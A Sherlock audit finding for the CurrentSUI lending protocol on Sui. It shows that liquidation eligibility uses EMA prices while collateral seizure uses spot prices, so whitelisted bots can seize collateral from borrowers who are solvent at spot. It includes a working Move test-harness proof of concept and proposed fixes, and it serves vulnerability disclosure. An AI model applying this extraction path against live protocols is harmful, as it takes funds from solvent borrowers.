---
tags:
  - lang/solidity
  - sector/bridge
  - sector/lending
  - sector/oracle
  - sector/stable
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - vuln/oracle/spot-price
  - impact/loss-of-funds/direct-drain
  - novelty/known-pattern
  - misassumption/oracle-is-reliable
  - misassumption/price-cannot-be-manipulated
  - fix/use-twap
  - trigger/price-manipulation
protocol: "[[CurrentSUI]]"
auditors:
  - "[[0x37]]"
  - "[[0xAsen]]"
  - "[[0xJulio]]"
  - "[[0xMoonStarz]]"
  - "[[0xTheBlackPanther]]"
  - "[[0xc0ffEE]]"
  - "[[0xca1x]]"
  - "[[0xiehnnkta]]"
  - "[[0xkmr_]]"
  - "[[0xpetern]]"
  - "[[0xrox]]"
  - "[[0xzen]]"
  - "[[1337]]"
  - "[[6FigFundedTrader]]"
  - "[[8olidity]]"
  - "[[9litched]]"
  - "[[A_Failures_True_Power]]"
  - "[[AbSattar]]"
  - "[[Afriaudit]]"
  - "[[Alpha]]"
  - "[[Audinarey]]"
  - "[[BilalXulfiqar]]"
  - "[[Bozwkd]]"
  - "[[CaptSinBad]]"
  - "[[CertiK_sec]]"
  - "[[Cryptor]]"
  - "[[Daian0s]]"
  - "[[Demonhatz]]"
  - "[[Diavolo]]"
  - "[[Draxen]]"
  - "[[EZeek33]]"
  - "[[Eldioscripto]]"
  - "[[Fade]]"
  - "[[HiteshRajpurohit]]"
  - "[[JUANMA]]"
  - "[[Jiberish]]"
  - "[[JohnLaw]]"
  - "[[K42]]"
  - "[[Mcfuzzlez]]"
  - "[[Mr.BlackKeys]]"
  - "[[OhmOudits]]"
  - "[[Orhukl]]"
  - "[[Petrus]]"
  - "[[Pumita]]"
  - "[[Razkky]]"
  - "[[SOPROBRO]]"
  - "[[Saurabh_Singh]]"
  - "[[Siddhu]]"
  - "[[Sshacks72]]"
  - "[[Stranger_Montana]]"
  - "[[TOSHI]]"
  - "[[Thragg_Oti254]]"
  - "[[TradingViews]]"
  - "[[Um158057]]"
  - "[[Wojack]]"
  - "[[Yakecho]]"
  - "[[ZeroTrust]]"
  - "[[acor8826]]"
  - "[[ah_mo54]]"
  - "[[arifulone]]"
  - "[[attacker_code]]"
  - "[[axelot]]"
  - "[[boodieboodieboo]]"
  - "[[bratwork]]"
  - "[[choguun168]]"
  - "[[chucks1093]]"
  - "[[cosminm53]]"
  - "[[cyberx]]"
  - "[[desaperh]]"
  - "[[eat-the-sky]]"
  - "[[gh0xt]]"
  - "[[grandchildrice]]"
  - "[[hblackfox]]"
  - "[[homb]]"
  - "[[ibrahimatix0x01]]"
  - "[[japerr]]"
  - "[[jayjoshix]]"
  - "[[jo13]]"
  - "[[kaiserlimp0]]"
  - "[[kammiz]]"
  - "[[kkkkkk]]"
  - "[[krikolkk]]"
  - "[[legat]]"
  - "[[magickenn]]"
  - "[[magtentic]]"
  - "[[marchev]]"
  - "[[maschinski]]"
  - "[[noosi0x01]]"
  - "[[odinshell]]"
  - "[[p1ramide]]"
  - "[[pindarev]]"
  - "[[playerOfGames]]"
  - "[[proofvoid]]"
  - "[[puzzles18]]"
  - "[[rajatbeladiya]]"
  - "[[rubencrxz]]"
  - "[[saamin]]"
  - "[[sahuang]]"
  - "[[sanbir]]"
  - "[[secssilia]]"
  - "[[shaflow01]]"
  - "[[sonanh08t4]]"
  - "[[tatsuya]]"
  - "[[unineko]]"
  - "[[veerendravamshi]]"
  - "[[webrainsec]]"
  - "[[xiaoming90]]"
  - "[[zenohkai]]"
  - "[[zubyoz]]"
report: "https://github.com/sherlock-audit/2026-03-current-finance-judging"
genome:
  - "[[spot-price]]"
  - "[[direct-drain]]"
  - "[[known-pattern]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[pyth-oracle-completeness]]"
  - "[[twap-collateral-valuation]]"
---
# H-1: Whitelisted liquidation bots will seize collateral from borrowers that are still solvent at spot price during EMA lag

- id: 65260
- impact: HIGH
- protocol: [[CurrentSUI]] Contest - March 2026
- reporter: 0xpetern (Sherlock)
- source: N/A

## Summary


This bug report is about a vulnerability found in a financial platform called Sui Move. The bug was discovered by a group of people and it can cause a loss of funds for borrowers using the platform. The root cause of the bug is that the platform uses different methods to determine eligibility for liquidation and to calculate how much collateral can be seized. This can result in collateral being seized from accounts that are still solvent at the current market price. The bug can only occur under specific conditions and can be exploited by a whitelisted liquidation bot. The impact of this bug can result in a loss of funds for borrowers and the amount of loss depends on the size of the liquidation. A proof of concept was created to demonstrate the bug and the recommended fix is to use the same pricing safety model for liquidation as is used for borrow and withdraw. 

## Details


Source: https://github.com/sherlock-audit/2026-03-current-finance-judging/issues/24 

## Found by 
0x37, 0xAsen, 0xJulio, 0xMoonStarz, 0xTheBlackPanther, 0xc0ffEE, 0xca1x, 0xiehnnkta, 0xkmr\_, 0xpetern, 0xrox, 0xzen, 1337, 6FigFundedTrader, 8olidity, 9litched, A\_Failures\_True\_Power, AbSattar, Afriaudit, Alpha, Audinarey, BilalXulfiqar, Bozwkd, CaptSinBad, CertiK\_sec, Cryptor, Daian0s, Demonhatz, Diavolo, Draxen, EZeek33, Eldioscripto, Fade, HiteshRajpurohit, JUANMA, Jiberish, JohnLaw, K42, Mcfuzzlez, Mr.BlackKeys, OhmOudits, Orhukl, Petrus, Pumita, Razkky, SOPROBRO, Saurabh\_Singh, Siddhu, Sshacks72, Stranger\_Montana, TOSHI, Thragg\_Oti254, TradingViews, Um158057, Wojack, Yakecho, ZeroTrust, acor8826, ah\_mo54, arifulone, attacker\_code, axelot, boodieboodieboo, bratwork, choguun168, chucks1093, cosminm53, cyberx, desaperh, eat-the-sky, gh0xt, grandchildrice, hblackfox, homb, ibrahimatix0x01, japerr, jayjoshix, jo13, kaiserlimp0, kammiz, kkkkkk, krikolkk, legat, magickenn, magtentic, marchev, maschinski, noosi0x01, odinshell, p1ramide, pindarev, playerOfGames, proofvoid, puzzles18, rajatbeladiya, rubencrxz, saamin, sahuang, sanbir, secssilia, shaflow01, sonanh08t4, tatsuya, unineko, veerendravamshi, webrainsec, xiaoming90, zenohkai, zubyoz

### Summary

Using EMA to decide whether a position can be liquidated, while using spot price to calculate how much collateral gets seized, will cause a loss of funds for borrowers that are still solvent at the current market price, as a whitelisted liquidation bot can qualify the position under the lagging EMA and then seize collateral using spot pricing.

### Root Cause

I noticed that the liquidation path in [`sui-move-contract/contracts/protocol/sources/internal/market/market.move#L944-L1046`](https://github.com/sherlock-audit/2026-03-currentsui-contest-march-2026/blob/main/sui-move-contract/contracts/protocol/sources/internal/market/market.move#L944-L1046) is not using one consistent oracle view:

- `ensure_liquidate_borrow_allowed()` uses `get_price()`, so liquidation eligibility and close-factor enforcement are both based on EMA.
- `liquidate_calculate_seize_ctokens()` later switches to `get_spot_price()` when it computes how much collateral the liquidator gets to take.

At the same time, the regular borrower-side health checks explicitly reject large EMA/spot divergence:

- Borrow health checks use `get_price_with_check()` in [`market.move#L1173-L1207`](https://github.com/sherlock-audit/2026-03-currentsui-contest-march-2026/blob/main/sui-move-contract/contracts/protocol/sources/internal/market/market.move#L1173-L1207)
- Withdraw health checks use `get_price_with_check()` in [`market.move#L1255-L1293`](https://github.com/sherlock-audit/2026-03-currentsui-contest-march-2026/blob/main/sui-move-contract/contracts/protocol/sources/internal/market/market.move#L1255-L1293)
- `get_price_with_check()` itself reverts when EMA and spot differ beyond tolerance in [`sui-move-contract/contracts/x_oracle/sources/entry_points/user.move#L42-L58`](https://github.com/sherlock-audit/2026-03-currentsui-contest-march-2026/blob/main/sui-move-contract/contracts/x_oracle/sources/entry_points/user.move#L42-L58)

The issue arises in the gap between those two behaviors. The protocol is saying "this oracle state is too divergent for normal borrow/withdraw health checks," but it still allows a liquidator to use that same state to push a liquidation through.

### Internal Pre-conditions

1. The market needs to list a collateral asset and a debt asset with active liquidation parameters. The shipped ETH/USDC setup already satisfies that.
2. The borrower needs to be close enough to the liquidation boundary that an EMA lag on the collateral side, or an EMA premium on the debt side, flips the account from healthy under spot to liquidatable under EMA.
3. A liquidation bot needs to hold a `PackageCallerCap` with liquidation permission, because `protocol::liquidate::liquidate*()` is permission-gated. That matches the contest's stated operating model, which explicitly assumes liquidation bots exist.
4. Oracle updates still need to be fresh. This issue does not depend on stale timestamps or stale-price acceptance.


### External Pre-conditions

1. Spot and EMA need to drift far enough apart on a liquidation-relevant asset to exceed the market's configured tolerance. The default tolerance is 10% per asset in [`market.move#L30-L31`](https://github.com/sherlock-audit/2026-03-currentsui-contest-march-2026/blob/main/sui-move-contract/contracts/protocol/sources/internal/market/market.move#L30-L31).
2. The drift needs to be in the borrower's bad direction under EMA while the position is still healthy under spot. The cleanest example is a fast recovery in collateral price where `spot > EMA`.
3. The liquidation bot needs to act before EMA catches up or before the borrower rebalances.

### Attack Path

1. A borrower opens a position close to the liquidation line, for example by posting ETH and borrowing USDC.
2. ETH moves up quickly. Spot reflects the move right away, but EMA is still lagging behind.
3. Once the gap is large enough, the protocol's normal borrow/withdraw checks start reverting through `get_price_with_check()`. Deposit and repay are still possible, but the protocol's standard health-check path no longer accepts this oracle state.
4. A whitelisted liquidation bot calls `liquidate_as_coin()` or `liquidate()`.
5. The protocol checks liquidation eligibility with EMA-only pricing and decides the account can be liquidated.
6. It then flips to spot pricing when it calculates how much collateral the liquidator should receive.
7. The liquidation goes through even though the borrower is still solvent at the current spot price, so collateral gets seized from a position that should not have been liquidatable under a consistent pricing model.

This is not just a pricing-style inconsistency on paper. I reproduced it with a concrete state:

- 1 ETH collateral
- 650 USDC debt
- ETH spot price = 1000
- ETH EMA price = 890
- USDC spot/EMA price = 1

Under those numbers:

- spot-weighted collateral remains above debt, so the position is healthy at the current market price
- the borrower-side `withdraw` path reverts because the protocol considers the EMA/spot divergence too large
- the liquidation path still succeeds and seizes collateral


### Impact

The borrower loses roughly `repay_amount * liquidation_incentive`, and the liquidation bot captures nearly all of that value apart from the protocol fee share.

Why this matters:

- This is direct principal loss, not a paper discrepancy or a nuisance revert.
- The loss scales with liquidation size.
- The protocol already treats this oracle state as serious enough to block borrow/withdraw health checks, so this is not a dust-only edge case.
- The bug is state-dependent: it needs a near-threshold account and a real EMA/spot divergence window. That makes it a constrained liquidation bug, not a global drain.

Using the exact ratio from the PoC and the sample contest configuration:

- Borrower collateral: $1,000,000
- Borrower debt: $650,000
- Close factor: 50%
- Liquidation incentive: 5%

A single liquidation can repay $325,000 of debt and seize roughly $341,250 of collateral. That creates an avoidable borrower loss of about **$16,250**.

The exact dollar amount will vary with position size, but the core problem stays the same: a routine liquidation bot can take real collateral from an account that is still healthy at the current spot price, purely because the protocol uses one oracle mode to decide whether liquidation is allowed and another one to decide how much collateral gets seized.

This can happen to any near-threshold account during a fast recovery where spot catches up before EMA does. The liquidator does not need to manipulate the oracle or rely on stale prices. It only needs to act inside a market condition the protocol already expects to see.


### PoC

This contest targets **Sui Move**, not EVM, so a Foundry test is not the right vehicle here.

For this codebase, the right equivalent is a deterministic `sui move test` that reproduces the bug from end to end. Sherlock's guidance only asks for a coded PoC that makes the path real and judgeable, especially when the bug depends on a specific market state like this one.

I used the native Move test harness to show two things:

1. the protocol rejects borrower-side borrow/withdraw health checks under the same EMA/spot divergence
2. the liquidation path still succeeds and seizes collateral from a spot-safe position

## PoC Step 1: add a test-only helper to set spot and EMA independently

File: `sui-move-contract/contracts/x_oracle/sources/internal/x_oracle.move`

```move
#[test_only]
public fun update_price_components<T>(
    self: &mut XOracle,
    clock: &Clock,
    spot_value: u64,
    ema_value: u64,
) {
    let coin_type = std::type_name::with_defining_ids<T>();
    let time = sui::clock::timestamp_ms(clock) / 1000;

    let spot = x_oracle::price_feed::new_component(spot_value, time);
    let ema = x_oracle::price_feed::new_component(ema_value, time);

    update_price_feed(
        self,
        usd(),
        coin_type,
        spot,
        ema,
    );
}
```

## PoC Step 2: add the integration test

File: `sui-move-contract/contracts/protocol/tests/integration/test_cases/oracle_liquidation_mismatch_test.move`

```move
#[test_only]
module protocol::oracle_liquidation_mismatch_test {

    use sui::clock;
    use sui::test_scenario;

    use math::float::Decimal;

    use protocol::market;
    use protocol::market_t::MainMarket;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;
    use protocol::open_obligation_t;
    use protocol::oracle_t;
    use protocol::value::coin_value;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use x_oracle::user_oracle::{get_price, get_spot_price};

    const ADMIN: address = @0xAD;
    const BORROWER: address = @0xBB;
    const LIQUIDATOR: address = @0xCC;

    fun obligation_weighted_value(
        market: &market::Market<MainMarket>,
        obligation_id: ID,
        collateral_price: Decimal,
        debt_price: Decimal,
    ): (Decimal, Decimal) {
        let obligation = market.borrow_obligation(obligation_id);
        let emode_group = market.emode_registry().borrow_emode_group(0);

        let collateral_type = std::type_name::with_defining_ids<ETH>();
        let collateral_emode = emode_group.borrow_emode(collateral_type);
        let liquidation_factor = collateral_emode.collateral().liquidation_factor();

        let collateral_reserve = market.get_reserve<MainMarket, ETH>();
        let ctoken_amount = obligation.ctoken_amount_by_coin(collateral_type);
        let collateral_amount = collateral_reserve.exchange_rate().mul(math::float::from(ctoken_amount));
        let collateral_value = coin_value(collateral_price, collateral_amount, default_eth_decimal_places());
        let weighted_collateral = collateral_value.mul(liquidation_factor);

        let debt_type = std::type_name::with_defining_ids<USDC>();
        let debt_emode = emode_group.borrow_emode(debt_type);
        let borrow_weight = debt_emode.borrow().borrow_weight();

        let debt_reserve = market.get_reserve<MainMarket, USDC>();
        let debt_amount = obligation.debt(debt_type).debt(debt_reserve.borrow_index().value());
        let debt_value = coin_value(debt_price, debt_amount, default_stable_decimal_places());
        let weighted_debt = debt_value.mul(borrow_weight);

        (weighted_collateral, weighted_debt)
    }

    // This test proves the protocol itself considers the divergence too unsafe
    // for normal borrower-side price-sensitive actions.
    #[test]
    #[expected_failure(abort_code = 8000009, location = x_oracle::user_oracle)]
    public fun ema_spot_divergence_blocks_borrower_defense() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        let (_admin_cap, app, mut market, coin_registry) = protocol::app_t::default_app_init<MainMarket>(
            scenario,
            &mut clock,
            ADMIN,
        );
        let mut x_oracle = oracle_t::init_t(scenario);

        clock.set_for_testing(300 * 1000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        let eth_amount = 1 * 10u64.pow(default_eth_decimal_places());
        let eth_coin = sui::coin::mint_for_testing<ETH>(eth_amount, test_scenario::ctx(scenario));

        scenario.next_tx(BORROWER);
        let obligation_owner_cap = open_obligation_t::open_obligation_t<MainMarket>(scenario, &app, &mut market);
        protocol::deposit::deposit<MainMarket, ETH>(&app, &mut market, &obligation_owner_cap, eth_coin, &clock, scenario.ctx());

        test_scenario::next_tx(scenario, BORROWER);
        let borrow_amount = 650 * 10u64.pow(default_stable_decimal_places());
        let borrowed = protocol::borrow::borrow<MainMarket, USDC>(
            &app,
            &obligation_owner_cap,
            &mut market,
            &coin_registry,
            borrow_amount,
            &x_oracle,
            &clock,
            scenario.ctx(),
        );
        std::unit_test::destroy(borrowed);

        // Spot says ETH is worth 1000, but EMA still lags at 890.
        // This is exactly the kind of divergence borrow/withdraw checks reject.
        clock.set_for_testing(301 * 1000);
        x_oracle.update_price_components<ETH>(
            &clock,
            oracle_t::calc_scaled_price(1000, 0),
            oracle_t::calc_scaled_price(890, 0),
        );
        x_oracle.update_price_components<USDC>(
            &clock,
            oracle_t::calc_scaled_price(1, 0),
            oracle_t::calc_scaled_price(1, 0),
        );

        test_scenario::next_tx(scenario, BORROWER);
        protocol::withdraw::withdraw<MainMarket, ETH>(
            &app,
            &mut market,
            &obligation_owner_cap,
            &coin_registry,
            1,
            &x_oracle,
            &clock,
            scenario.ctx(),
        );

        abort 0
    }

    // This test proves the real bug: the same state is still liquidatable.
    #[test]
    public fun liquidate_spot_safe_position_when_ema_lags() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        let (admin_cap, mut app, mut market, coin_registry) = protocol::app_t::default_app_init<MainMarket>(
            scenario,
            &mut clock,
            ADMIN,
        );
        let mut x_oracle = oracle_t::init_t(scenario);

        clock.set_for_testing(300 * 1000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        let eth_amount = 1 * 10u64.pow(default_eth_decimal_places());
        let eth_coin = sui::coin::mint_for_testing<ETH>(eth_amount, test_scenario::ctx(scenario));

        scenario.next_tx(BORROWER);
        let obligation_owner_cap = open_obligation_t::open_obligation_t<MainMarket>(scenario, &app, &mut market);
        protocol::deposit::deposit<MainMarket, ETH>(&app, &mut market, &obligation_owner_cap, eth_coin, &clock, scenario.ctx());

        test_scenario::next_tx(scenario, BORROWER);
        let borrow_amount = 650 * 10u64.pow(default_stable_decimal_places());
        let borrowed = protocol::borrow::borrow<MainMarket, USDC>(
            &app,
            &obligation_owner_cap,
            &mut market,
            &coin_registry,
            borrow_amount,
            &x_oracle,
            &clock,
            scenario.ctx(),
        );
        std::unit_test::destroy(borrowed);

        // Same divergence as above: current spot is healthy, EMA still says unhealthy.
        clock.set_for_testing(301 * 1000);
        x_oracle.update_price_components<ETH>(
            &clock,
            oracle_t::calc_scaled_price(1000, 0),
            oracle_t::calc_scaled_price(890, 0),
        );
        x_oracle.update_price_components<USDC>(
            &clock,
            oracle_t::calc_scaled_price(1, 0),
            oracle_t::calc_scaled_price(1, 0),
        );

        let oracle_base = x_oracle::x_oracle::usd();
        let (weighted_collateral_ema, weighted_debt_ema) = obligation_weighted_value(
            &market,
            obligation_owner_cap.id(),
            get_price(&x_oracle, std::type_name::with_defining_ids<ETH>(), oracle_base, &clock),
            get_price(&x_oracle, std::type_name::with_defining_ids<USDC>(), oracle_base, &clock),
        );
        let (weighted_collateral_spot, weighted_debt_spot) = obligation_weighted_value(
            &market,
            obligation_owner_cap.id(),
            get_spot_price(&x_oracle, std::type_name::with_defining_ids<ETH>(), oracle_base, &clock),
            get_spot_price(&x_oracle, std::type_name::with_defining_ids<USDC>(), oracle_base, &clock),
        );

        // EMA-based liquidation check says the account is unsafe...
        assert!(weighted_collateral_ema.lt(weighted_debt_ema), 0);
        // ...while current spot pricing says it is still healthy.
        assert!(weighted_collateral_spot.gt(weighted_debt_spot), 1);

        scenario.next_tx(LIQUIDATOR);
        let permit = protocol::whitelist_admin::mint_new_whitelist(&admin_cap, &mut app, test_scenario::ctx(scenario));
        protocol::whitelist_admin::update_permission(
            &admin_cap,
            &mut app,
            object::id(&permit),
            protocol::whitelist_admin::liquidation(),
            true,
        );

        let usdc_amount = 100 * 10u64.pow(default_stable_decimal_places());
        let usdc_coin = sui::coin::mint_for_testing<USDC>(usdc_amount, test_scenario::ctx(scenario));

        let (collateral, refund) = protocol::liquidate::liquidate_as_coin<MainMarket, USDC, ETH>(
            &app,
            &permit,
            obligation_owner_cap.id(),
            &mut market,
            usdc_coin,
            &coin_registry,
            &x_oracle,
            &clock,
            scenario.ctx(),
        );

        // This should never be reachable if liquidation respected the same pricing model.
        assert!(collateral.value() > 0, 2);
        std::unit_test::destroy(collateral);
        std::unit_test::destroy(refund);
    }
}
```

## How to run

```bash
sui move test oracle_liquidation_mismatch --path sui-move-contract/contracts/protocol
```

## Terminal output

```text
[NOTE] Dependencies on Sui, MoveStdlib, Bridge, DeepBook, and SuiSystem are automatically added, but this feature is disabled for your package because you have explicitly included dependencies on Sui.
INCLUDING DEPENDENCY MoveStdlib
INCLUDING DEPENDENCY Pyth
INCLUDING DEPENDENCY Sui
INCLUDING DEPENDENCY TestCoin
INCLUDING DEPENDENCY Wormhole
INCLUDING DEPENDENCY math
INCLUDING DEPENDENCY x_oracle
BUILDING protocol
Running Move unit tests
[ PASS    ] protocol::oracle_liquidation_mismatch_test::ema_spot_divergence_blocks_borrower_defense
[ PASS    ] protocol::oracle_liquidation_mismatch_test::liquidate_spot_safe_position_when_ema_lags
Test result: OK. Total tests: 2; passed: 2; failed: 0
```

I also reran the full `protocol` suite after adding the PoC. It passed `87/87`, which matters here because it shows this is not a contrived harness artifact.

```text
Test result: OK. Total tests: 87; passed: 87; failed: 0
```

## Why this PoC matters

This is exactly the kind of issue that benefits from a coded PoC:

- the vulnerability path is non-obvious
- it has a real oracle-state constraint
- the attack requires showing two different valuation modes produce contradictory outcomes on the same position

Without code, a judge has to trust several steps of oracle math and liquidation logic at once. The test removes that ambiguity.


### Mitigation

The clean fix is to make liquidation use the same pricing safety model that borrow and withdraw already use.

Any of the following would close the gap:

1. Use `get_price_with_check()` for liquidation eligibility and for the debt-value branch inside close factor enforcement.
2. Use the same oracle mode consistently for both liquidation eligibility and seizure math. If EMA is chosen for eligibility, seizure should not silently switch to spot.
3. Refuse liquidation entirely when EMA and spot diverge beyond tolerance, the same way borrow and withdraw already do.

The simplest fix is probably:

- replace liquidation-side `get_price()` and `get_spot_price()` calls with the same `get_price_with_check()` flow already used by non-liquidation health checks
- only allow liquidation once the oracle state is considered trustworthy under the protocol's own tolerance rules
